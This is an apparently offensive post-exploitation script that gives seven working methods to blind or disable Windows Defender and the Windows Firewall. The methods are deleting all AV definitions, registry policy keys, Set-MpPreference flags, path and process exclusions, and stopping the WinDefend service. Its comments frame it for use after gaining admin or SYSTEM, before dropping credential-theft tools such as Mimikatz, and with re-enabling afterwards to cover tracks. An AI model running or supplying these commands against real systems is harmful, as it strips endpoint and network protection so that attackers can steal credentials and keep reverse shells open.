# ============================================================
# Windows Defender Disable Script
# ============================================================
# WHAT THIS DOES:
#   Multiple methods to disable Windows Defender/Windows Security.
#   Methods range from non-destructive (exclusions) to aggressive
#   (removing definitions, disabling real-time protection).
#
# WHEN TO USE:
#   - When Defender is catching tools you need to run on disk
#   - After gaining SYSTEM or Administrator privileges
#   - Before dropping tooling (Mimikatz, SharpHound, etc.)
#
# REQUIREMENTS:
#   - Local Administrator (minimum)
#   - SYSTEM preferred for registry modifications
#   - Tamper Protection must be disabled first (or you're SYSTEM)
#     Check: Get-MpPreference | select TamperProtection
#     If TamperProtection = 5, methods below may fail
#
# NOTE ON TAMPER PROTECTION:
#   Windows 10/11 has "Tamper Protection" which blocks Defender
#   from being disabled even as admin. Options if this is enabled:
#     1. Need to be SYSTEM (not just admin) for some registry writes
#     2. Use exploit to get SYSTEM first
#     3. Use encrypted/obfuscated loaders instead (03-loaders/shellcode-runners/clrunner.cs)
# ============================================================

# -------------------------------------------------------
# Method 1: Remove all AV definitions (fastest, temporary blindness)
# -------------------------------------------------------
# This removes ALL virus definitions from Defender.
# Defender becomes essentially blind until definitions are re-downloaded.
# Does NOT require disabling services — Defender still runs but can't detect.
# Definitions will auto-update and re-download — act fast after running this.
cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all


# -------------------------------------------------------
# Method 2: Registry-based disable (persistent until reboot/GPO refresh)
# -------------------------------------------------------
# Adds registry keys under the Windows Defender policy path.
# These keys are checked at Defender startup and runtime.

# Disable real-time monitoring (most important — stops on-access scanning)
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f

# Disable behavior monitoring (stops heuristic/behavioral detection)
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f

# Disable the entire Defender service
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f


# -------------------------------------------------------
# Method 3: PowerShell Set-MpPreference (most feature-complete)
# -------------------------------------------------------
# Set-MpPreference configures Windows Defender settings.
# This is the preferred method when you have PS access and admin rights.

# Disable real-time monitoring + network protection + IOAV protection
Set-MpPreference -DisableIntrusionPreventionSystem $true `
                 -DisableIOAVProtection $true `
                 -DisableRealtimeMonitoring $true `
                 -DisableScriptScanning $true `
                 -DisableBehaviorMonitoring $true `
                 -DisableBlockAtFirstSeen $true `
                 -EnableControlledFolderAccess Disabled

# Alternatively, run as a one-liner:
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true


# -------------------------------------------------------
# Method 4: Disable Windows Firewall (stops outbound C2 blocking)
# -------------------------------------------------------
# If Defender blocks outbound connections from your reverse shell
# (e.g., network protection feature), disable the firewall too.
NetSh Advfirewall set allprofiles state off


# -------------------------------------------------------
# Method 5: Add exclusion path (stealthier, doesn't fully disable)
# -------------------------------------------------------
# Instead of disabling Defender entirely, just exclude a directory.
# Anything in this path won't be scanned.
# Less noisy, less likely to trigger alerting.
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
Add-MpPreference -ExclusionPath "C:\Users\Public"
Add-MpPreference -ExclusionPath "C:\ProgramData"

# Also exclude specific processes
Add-MpPreference -ExclusionProcess "powershell.exe"
Add-MpPreference -ExclusionProcess "cmd.exe"


# -------------------------------------------------------
# Method 6: Stop the WinDefend service (if not tamper protected)
# -------------------------------------------------------
# Stopping the service disables Defender until next reboot.
Stop-Service -Name WinDefend -Force
Set-Service -Name WinDefend -StartupType Disabled


# -------------------------------------------------------
# Method 7: Re-enable Defender after you're done (opsec)
# -------------------------------------------------------
# Leave the system in a clean state
Set-MpPreference -DisableRealtimeMonitoring $false
NetSh Advfirewall set allprofiles state on
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring" /f


# -------------------------------------------------------
# Verify Defender status
# -------------------------------------------------------
Get-MpComputerStatus | select AMRunningMode, RealTimeProtectionEnabled, TamperProtectionSource
